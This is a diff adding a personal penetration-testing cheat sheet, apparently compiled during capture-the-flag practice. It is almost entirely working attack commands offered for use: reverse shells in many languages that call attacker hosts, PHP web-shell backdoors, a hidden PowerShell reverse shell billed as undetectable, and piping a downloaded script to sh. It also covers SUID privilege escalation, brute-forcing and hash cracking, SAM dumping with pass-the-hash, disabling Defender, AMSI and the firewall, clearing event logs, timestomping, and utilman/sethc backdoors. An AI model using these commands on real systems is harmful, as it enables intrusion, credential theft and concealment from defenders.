@@ -1,0 +1,1012 @@
+
+ONE-LINER
+---------------------------------------------------------------------------------------------------------------------
+Perl Reverse Shell One-Liner
+perl -e 'use Socket;$i="#URL_HERE#";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Perl Reverse Shell One-Liner 2
+perl -e 'use Socket;$i="$ENV{<attacker IP>}";$p=$ENV{<attacker port>};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+Open a netcat on your system using
+nc -lnvp 4444
+
+----------------------------------------------------------
+Python reverse shell
+
+/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.36.200",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+----------------------------------------------------------
+
+Ruby Reverse Shell One-Liner
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["<attacker IP>"],ENV["<attacker port>"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+----------------------------------------------------------
+
+Telnet Reverse Shell One-Liner
+TF=$(mktemp -u); mkfifo $TF && telnet <attacker IP> <attacker port> 0<$TF | /bin sh 1>$TF
+----------------------------------------------------------
+
+Bash Reverse Shell One-Liner
+bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1
+----------------------------------------------------------
+
+Netcat Reverse Shell One-Liner
+nc -e /bin/sh <attacker IP> <attacker port>
+
+
+
+----------------------------------------------------------
+Backdoor One-Liner
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+Smaller Backdoor One-Liner
+<?=`$_GET[_]`?>
+
+
+PHP Reverse Shell One-Liner
+php -r '$sock=fsockopen("<attacker IP>",<attacker port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+----------------------------------------------------------
+
+Undetectable Hidden Win 10/11 Reverse Shell
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('YOUR_IP', PORT);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+
+----------------------------------------------------------
+
+Powershell Reverse Shell One-Liner
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker IP>',<attacker port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+----------------------------------------------------------
+
+ZSH Reverse Shell
+zsh -c 'zmodload zsh/net/tcp && ztcp <attacker IP> <attacker port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+----------------------------------------------------------
+
+Python Privilege Escalation
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+----------------------------------------------------------
+Enumerate possibly installed useful binaries
+which nmap awk aws nc zsh ncat netcat nc.traditional wget curl ping gcc gcc-5 g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo nano fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+
+
+check sudo version to see if it's vulnerable
+sudo -V														#Affected Versions;		From (including): 1.8.0		Up to (excluding): 1.9.12
+
+
+also check the cron jobs. use pypy64 to find recurring programs running. you might find one that's root that you'll be able to edit
+
+
+
+
+Enumerate possibly installed useful binaries using python
+varlist = "which nmap aws nc zsh ncat netcat nc.traditional wget curl ping gcc gcc-5 g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo nano fetch docker lxc ctr runc rkt kubectl 2>/dev/null"
+varlisted = varlist.split(" ")
+checker = subprocess.run(varlisted, stdout=subprocess.PIPE,text=True)
+print(checker.stdout)
+
+
+----------------------------------------------------------
+
+Network Enumeration
+
+ifconfig: Display network interface information.
+netstat -tulpn: List active network connections.
+arp -a: Display ARP table.
+
+
+
+
+----------------------------------------------------------
+
+DIRECTORY ENUMERATION TOOLS
+gobuster dir -u #URL_HERE# -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 120 -x txt,php,html
+
+Another Dict Location
+/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+
+feroxbuster -u  http://#URL_HERE#:9999/ --thorough -x php,txt -t 100 --random-agent -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --depth 1
+
+
+
+__________________________________________________________
+
+SQLMAP COMMAND
+
+
+FOR URLS
+sqlmap -u "http://#URL_HERE#/simple/moduleinterface.php?mact=News,m1_,default,0" --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/Downloads/favpass.txt" --dbs
+
+FOR POST-REQUESTS
+sqlmap -r postrequest.txt -p Username --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/Downloads/favpass.txt" --dbs
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------------
+Linpeas One-Liner
+file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm -rf $file;echo "File: $file";echo "[+]Gathering system information...";printf $B"[*] "$RED"BASIC SYSTEM INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Operative system\n"$NC >> $file;(cat /proc/version || uname -a ) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"PATH\n"$NC >> $file;echo $PATH 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Date\n"$NC >> $file;date 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo version\n"$NC >> $file;sudo -V 2>/dev/null| grep "Sudo ver" >> $file;echo "" >> $file;printf $Y"[+] "$RED"selinux enabled?\n"$NC >> $file;sestatus 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Useful software?\n"$NC >> $file;which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Capabilities\n"$NC >> $file;getcap -r / 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Environment\n"$NC >> $file;(set || env) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Top and cleaned proccesses\n"$NC >> $file;ps aux 2>/dev/null | grep -v "\[" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Binary processes permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Services\n"$NC >> $file;(/usr/sbin/service --status-all || /sbin/chkconfig --list || /bin/rc-status) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Different processes executed during 1 min (HTB)\n"$NC >> $file;if [ "`ps -e --format cmd`" ]; then for i in {1..121}; do ps -e --format cmd >> $file.tmp1; sleep 0.5; done; sort $file.tmp1 | uniq | grep -v "\[" | sed '/^.\{500\}./d' >> $file; rm $file.tmp1; fi;echo "" >> $file;printf $Y"[+] "$RED"Proccesses binary permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Scheduled tasks\n"$NC >> $file;crontab -l 2>/dev/null >> $file;ls -al /etc/cron* 2>/dev/null >> $file;cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root /var/spool/anacron 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Any sd* disk in /dev?\n"$NC >> $file;ls /dev 2>/dev/null | grep -i "sd" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Storage information\n"$NC >> $file;df -h 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Unmounted file-system?\n"$NC >> $file;cat /etc/fstab 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Printer?\n"$NC >> $file;lpstat -a 2>/dev/null >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering network information...";printf $B"[*] "$RED"NETWORK INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Hostname, hosts and DNS\n"$NC >> $file;cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" >> $file;dnsdomainname 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Networks and neightbours\n"$NC >> $file;cat /etc/networks 2>/dev/null >> $file;(ifconfig || ip a) 2>/dev/null >> $file;iptables -L 2>/dev/null >> $file;ip n 2>/dev/null >> $file;route -n 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Ports\n"$NC >> $file;(netstat -punta || ss -t; ss -u) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Can I sniff with tcpdump?\n"$NC >> $file;timeout 1 tcpdump >> $file 2>&1;echo "" >> $file;echo "" >> $file;echo "[+]Gathering users information...";printf $B"[*] "$RED"USERS INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Me\n"$NC >> $file;(id || (whoami && groups)) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l without password\n"$NC >> $file;echo '' | sudo -S -l -k 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Do I have PGP keys?\n"$NC >> $file;gpg --list-keys 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Superusers\n"$NC >> $file;awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Login\n"$NC >> $file;w 2>/dev/null >> $file;last 2>/dev/null | tail >> $file;echo "" >> $file;printf $Y"[+] "$RED"Users with console\n"$NC >> $file;cat /etc/passwd 2>/dev/null | grep "sh$" >> $file;echo "" >> $file;printf $Y"[+] "$RED"All users\n"$NC >> $file;cat /etc/passwd 2>/dev/null | cut -d: -f1 >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering files information...";printf $B"[*] "$RED"INTERESTING FILES\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"SUID\n"$NC >> $file;find / -perm -4000 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"SGID\n"$NC >> $file;find / -perm -g=s -type f 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside \$HOME (limit 20)\n"$NC >> $file;ls -la $HOME 2>/dev/null | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"20 First files of /home\n"$NC >> $file;find /home -type f 2>/dev/null | column -t | grep -v -i "/"$USER | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside .ssh directory?\n"$NC >> $file;find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"*sa_key* files\n"$NC >> $file;find / -type f -name "*sa_key*" -ls 2>/dev/null -exec ls -l {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"Mails?\n"$NC >> $file;ls -alh /var/mail/ /var/spool/mail/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"NFS exports?\n"$NC >> $file;cat /etc/exports 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Hashes inside /etc/passwd? Readable /etc/shadow or /etc/master.passwd?\n"$NC >> $file;grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null >> $file;cat /etc/shadow /etc/master.passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Readable /root?\n"$NC >> $file;ls -ahl /root/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Inside docker or lxc?\n"$NC >> $file;dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`;lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`;if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" >> $file; fi;if [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" >> $file; fi;echo "" >> $file;printf $Y"[+] "$RED"*_history, profile, bashrc, httpd.conf\n"$NC >> $file;find / -type f \( -name "*_history" -o -name "profile" -o -name "*bashrc" -o -name "httpd.conf" \) -exec ls -l {} \; 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"All hidden files (not in /sys/) (limit 100)\n"$NC >> $file;find / -type f -iname ".*" -ls 2>/dev/null | grep -v "/sys/" | head -n 100 >> $file;echo "" >> $file;printf $Y"[+] "$RED"What inside /tmp, /var/tmp, /var/backups\n"$NC >> $file;ls -a /tmp /var/tmp /var/backups 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Interesting writable Files\n"$NC >> $file;USER=`whoami`;HOME=/home/$USER;find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'| sort | uniq >> $file;for g in `groups`; do find / \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'; done >> $file;echo "" >> $file;printf $Y"[+] "$RED"Web files?(output limited)\n"$NC >> $file;ls -alhR /var/www/ 2>/dev/null | head >> $file;ls -alhR /srv/www/htdocs/ 2>/dev/null | head >> $file;ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head >> $file;ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head >> $file;echo "" >> $file;printf $Y"[+] "$RED"Backup files?\n"$NC >> $file;find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*back*" -o -name "*bck*" \) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find IPs inside logs\n"$NC >> $file;grep -a -R -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/ 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find 'password' or 'passw' string inside /home, /var/www, /var/log, /etc\n"$NC >> $file;grep -lRi "password\|passw" /home /var/www /var/log 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l (you need to puts the password and the result appear in console)\n"$NC >> $file;sudo -l;
+
+
+
+
+
+
+
+
+
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
+
+
+
+
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+
+
+
+---------------------------------------------------------
+find suid binaries for privilege escalation one liner
+find / -perm -6000 2>/dev/null | grep '/bin/'
+
+find suid binaries for privilege escalation one liner
+find / -perm -4000 2>/dev/null
+
+find guid binaries for privilege escalation one liner
+find / -perm -2000 2>/dev/null
+
+find suid binaries for root privilege escalation one liner (tryhackme)
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+find files that can be run by group for privilege escalation one liner
+
+find / -group <groupname> -type f 2>/dev/null
+
+
+Find Both Group-Readable and Group-Writable Files:
+find /path/to/search -type f -perm /g+r,g+w
+
+
+Give SUID permission to the find command for privilege escalation. Run thhis from a root program
+chmod u+s /usr/bin/find
+
+
+As an alternative, you could put the below into a php file that is run by root
+$command = 'chmod u+s /usr/bin/find';
+$output = exec($command);   
+
+Then run the below to exploit the suid binary of the find command
+find . -exec /bin/sh -p \; -quit
+----------------------------------------------------------
+Make shell interactive(fix tty issue)
+find . -exec /bin/sh \; -quit
+
+
+Make shell interactive 
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+Make shell interactive with arrow use, etc...
+
+python -c 'import pty;pty.spawn("/bin/bash");'
+CTRL + Z      			#backgrounds netcat session
+stty raw -echo;fg               #brings netcat session back to the foreground
+export TERM=xterm		#exporting the TERM variable
+reset				#resets the terminal
+
+#you should now have an intelligent terminal
+
+----------------------------------------------------------
+Copy files over ssh from attacker machine to victim
+scp ~/Documents/tools/linpeas.sh jan@#URL_HERE#:/dev/shm
+
+
+connect over ssh using generated keypair.
+ssh #USERNAME#@#IP_ADDRESS# -i #RSA_PRIVATE_KEY#						#The public key will be on remote server, you'll have the private key. The default generation will have private key named "id_rsa" an public key named "id_rsa.pub". Public key should also be copied into /home/#USERNAME#/.ssh/known_hosts OR authorized_keys.
+
+
+One-liner to generate ssh keys
+ssh-keygen -C "greenzstyle.nigeria@gmail.com" -f ./id_rsa -N ""					#The -C specifies the email identifier to be used, not specifying it will generate one of the PC user id. -f specifies the location as well as the name. -N specifies the passphrase, it's empty in this case
+
+
+
+
+
+CRACKING
+---------------------------------------------------------------------------------------------------------------------
+Identifying a hash
+hashidentifier
+
+
+Crack an md5 hash
+hashcat -m 0 -a 0 -o cracked.txt c3fcd3d76192e4007dfb496cca67e13b ~/Downloads/favpass.txt
+
+
+TO BRUTEFORCE USERNAME FROM LIST WITH PASSWORD AS "test"
+hydra -L passlist.txt -p test 10.10.129.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+TO BRUTEFORCE PASSWORD FROM LIST WITH USERNAME AS "Elliot"
+hydra -l Elliot -P passlist 10.10.129.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+BRUTEFORCE AN SSH PASSWORD FROM LIST USING USERNAME
+hydra -l jan -P pass.txt 192.168.29.135 ssh -t 4
+
+EXTRACT HASH FROM PRIVATE SSH KEY
+ssh2john #SSH PRIVATE KEY FILE# > #FILE TO OUTPUT HASH TO#
+
+EXTRACT HASH FROM PRIVATE KEEPASS DATBASE
+keepass2john #KEEPASS DATABASE FILE# > #FILE TO OUTPUT HASH TO#
+
+CRACK HASHED EXTRACTED HASH
+john #FILE CONTANING EXTRACTED HASH# --wordlist=#PATH TO WORDLIST FOR BRUTEFORCE#
+
+
+EXTRACT HASH FROM PRIVATE PGP/ASC KEY
+gpg2john tryhackme.asc > pgpjohn
+
+
+
+
+
+
+
+
+
+TOOLS
+-----------------------------------------------------------------------------------------------------------------------
+wpscan --api-token #WPSCAN_API# --random-user-agent -e --url 3#URL_HERE# | tee wpscan.txt
+
+python3 sqlmap.py -u "https://#URL_HERE#/?s= --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/dict/favpass.txt" --dbs
+
+
+
+
+
+
+
+
+MULTILINE PRIVILEGE ESCALATION
+------------------------------------------------------------------------------------------------------------------------
+Nmap Privilege Escalation
+nmap --interactive
+nmap> !sh
+
+
+
+
+
+ENUMERATION
+------------------------------------------------------------------------------------------------------------------------
+use
+enum4linux -a IPADDRESS
+to enumerate users and possibly passwords on machines that have smb open
+
+
+
+
+
+
+
+
+WINDOWS DEFENDER BYPASS
+-----------------------------------------------------------------------------------------------------------------------
+
+Windows Defender Evasion
+Note: All below commands require administrative privileges on the system!
+
+You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!
+
+Get-MpPreference | select-object -ExpandProperty ExclusionPath
+
+# Disable Defender. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. 🚩
+sc config WinDefend start= disabled
+sc stop WinDefend
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+## Exclude a process / location (Add an exclusion directory for your shady stuff. 👀)
+Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
+Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+Add-MpPreference -ExclusionPath C:\Video, C:\install
+
+# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+# Disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
+# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+
+# Wipe currently stored definitions
+# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
+MpCmdRun.exe -RemoveDefinitions -All
+
+# Remove signatures (if Internet connection is present, they will be downloaded again):
+PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+# Disable Windows Defender Security Center
+reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+
+# Disable Real Time Protection
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+
+
+
+
+
+
+
+
+
+WINDOWS FIREWALL BYPASS
+-----------------------------------------------------------------------------------------------------------------------
+Netsh Advfirewall show allprofiles
+NetSh Advfirewall set allprofiles state off
+
+# ip whitelisting
+New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+
+
+
+
+
+
+
+
+
+
+
+MISC
+-----------------------------------------------------------------------------------------------------------------------
+use 
+sudo -l
+to see commands that can be run by the current user
+
+use
+sudo su - username
+to switch to that user
+
+---------------------------
+when running reverse shells, try using port 53, that's the DNS shell and it's very rarely blocked for outgoing connections by firewalls
+
+---------------------------
+you can use "type" as an alternative to cat in cmd.
+"cat" also works in powershell
+
+you can also run "file #FILENAME#" to see what a file is
+
+---------------------------
+
+INTERCHANGEABLE COMMANDS
+head,cat,less,more,tail
+
+---------------------------
+SITES FOR COMMANDS
+https://gtfobins.github.io/
+https://wadcoms.github.io
+
+SITES FOR UTILITIES
+https://gchq.github.io/CyberChef/	MULTIUTILITIES
+https://www.aperisolve.com/		CHECK FOR HIDDEN STUFF IN IMAGE
+
+SITES FOR VULNS
+https://attackerkb.com/
+https://exploit-db.com/
+
+---------------------------
+
+MAKE SURE TO CHECK IN HOME FOLDER OF OTHER USERS FOR SSH KEYS
+___________________________
+
+To open a root shell
+sudo -s
+
+---------------------------
+
+MAKE SURE TO RUN NMAP, THEN GOBUSTER
+
+---------------------------
+
+login to phpmyadmin of remote server
+mysql -u root -p -h #SERVER IP ADDRESS#
+
+
+---------------------------
+
+you could try curling the open ports of the webserver from itself (use 127.0.0.1) and is there is a mysql port, you could try finding the login page, extracting the password, and logging in to see other data
+
+you can also use netstat -tuln to find open ports and services
+
+---------------------------
+
+DECRYPTING PGP FILE
+gpg --import tryhackme.asc
+gpg --decrypt credential.pgp
+
+---------------------------
+
+COMMANDS FOR POP3
+
+To login to pop3
+
+user <username with or without the @>
+pass <password>
+
+After successful login use the following command to list email in inbox of user
+
+list
+
+After list email, use the following command to read the email. S/N is the list number
+
+retr S/N
+
+
+
+
+----------------------------
+If there's a banner on ssh login, try to see if you can modify any of the files in
+
+/etc/update-motd.d
+
+add a reverse shell and it should run as root when any ssh user logs in
+
+----------------------------
+check what groups your user belongs to with <id>, there may be an exploit to escalate privileges for a group like lxd 
+
+
+
+----------------------------
+
+if you can run a command as another user, especially through a file that takes command input, you start a shell as that user
+----------------------------
+
+
+To extract files from a steganofied picture use
+steghide extract -sf file.jpg
+
+hit enter for no passphrase
+----------------------------
+
+to break into zipfiles, use
+
+zip2john zipfile > file_to_store_hash
+
+then
+
+john file_to_store_hash --wordlist="/path/to/wordlist"
+
+----------------------------
+
+base64 -d <<< "base64_text_to_be_decoded"
+
+----------------------------	
+
+To crack a shadow file, run the following command to concatenate the shadow and passwd file
+
+unshadow passwd.txt shadow.txt > unshadowed.txt
+
+then feed it to john
+
+john unshadowed.txt --wordilst="/path/to/wordlist/"
+
+----------------------------
+
+grab the banner of a server using this
+
+curl -I site_or_IP_address
+
+
+----------------------------
+
+get the os and details of machine using this
+
+uname -a
+----------------------------
+
+if sudo doesn't exist, try checking for apt or dpkg. You can auto install it through apt or a downloaded deb package.
+
+you could also try unpacking the package of sudo manually, it'll probably work
+
+----------------------------
+set suid on bash using
+chmod +s /bin/bash
+
+after setting suid binary on bash (/bin/bash), migrate bash session to a root session using "bash -p"
+
+----------------------------
+
+
+Get on the victim's computer, open their registry editor, navigate to HKEY_LOCAL_MACHINE and save the "SAM" and "SYSTEM" folders.
+NOTE: USER MUST BE AN ADMINISTRATOR
+You can easily do this from a terminal by running
+reg save HKLM\sam C:\sam.save
+reg save HKLM\system C:\system.save
+
+copy the saved files to a flash drive
+
+Open up your kali and run the following tool to extract hash from the files
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+
+grab the column of the users that is the nthash
+
+run through a hash cracker. may be use cupps tool to generate personalised dictionary list.
+
+After getting the password, run the following to get a powershell of the victim pc on your own pc
+evil-winrm -i #VICTIM_IP_ADDRESS# -u #VICTIM_USERNAME# -p #VICTIM_PASSWORD# -H #VICTIM_PASSWORD_HASH_FOR_PASS_THE_HASH_ATTACK#
+
+an alternative that does the same is
+python3 psexec.py #DOMAIN_NAME#/#VICTIM_USERNAME#:#VICTIM_PASSWORD#@#VICTIM_IP_ADDRESS#
+
+
+You can also run the following to get rdp into victim system
+xfreerdp /v:#VICTIM_IP_ADDRESS# /u:#VICTIM_USERNAME# /p:#VICTIM_PASSWORD# /pth:#VICTIM_PASSWORD_HASH_FOR_PASS_THE_HASH_ATTACK#
+
+rdesktop -d #VICTIM_DOMAIN# -u #VICTIM_USERNAME# -p #VICTIM_PASSWORD# #VICTIM_IP_ADDRESS#
+
+
+
+----------------------------
+
+To find subdomains when pentesting,
+- use crt.sh
+- use google dork "-site:#WEB_SITE# site:*.#WEBSITE#"
+- use sn1per (this covers practically everything)
+- use nuclei (this allows you find bugs)
+- use gobuster/feroxbuster
+- try ARIN as well
+
+- use black widow (this allows you get list of urls and forms you can run in sqlmap)
+
+-----------------------------
+load powershell		#load powershell module into meterpreter
+load kiwi		#load mimikatz into meterpreter
+creds_all		#command to dump all credentails after loading kiwi
+timestomp		#use this to hide or mimic access and creation time of a file. This further covers your tracks. the '-v' options shows the MACE of a file '-f' mimics timestamp of another file #timestomp your_file -f file_to_mimic# and '-b' blanks the timestamp
+
+run post/multi/recon/local_exploit_suggester		#background the meterpreter session and run this for privilege escalation. It uses WinPEAS.
+
+getsystem		#use this to attempt to escalate privileges on victim machine through meterpreter. If it doesn't run then perhaps the priv extension isn't loaded. Run "use priv" to load it.
+
+migrate #PROCESS PID#	#use this to migrate into another process, perhaps the printer service so you can access processes such as lsass.exe
+
+------------------------------
+Clear security and system logs
+cmd.exe /c wevtutil.exe cl System
+cmd.exe /c wevtutil.exe cl Security
+
+
+-------------------------------
+
+Create RDP Backdoor using utilman.exe
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.
+
+Create RDP Backdoor using sethc.exe
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+Hit F5 a bunch of times when you are at the RDP login screen.
+
+--------------------------------
+Test WORDPRESS XMLRPC PINGBACK
+curl --data "<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" https://#WORDPRESS_SITE#/xmlrpc.php
+
+
+
+---------------------------------
+WINDOWS PRIVILEGE ESCALATION (SERVER AND PC) - CVE-2019-1388
+(Affected Systems
+SERVER
+Windows 2008r2 7601
+Windows 2012r2 9600
+Windows 2016 14393
+Windows 2019 1773
+
+WORKSTATION
+Windows 7 SP1 7601
+Windows 8 9200
+Windows 8.1 9600
+Windows 10 1511 10240
+Windows 10 1607 14393
+Windows 10 1703 15063
+Windows 10 1709 16299)
+
+1) find a program that can trigger the UAC prompt screen(such as hhupd.exe)
+
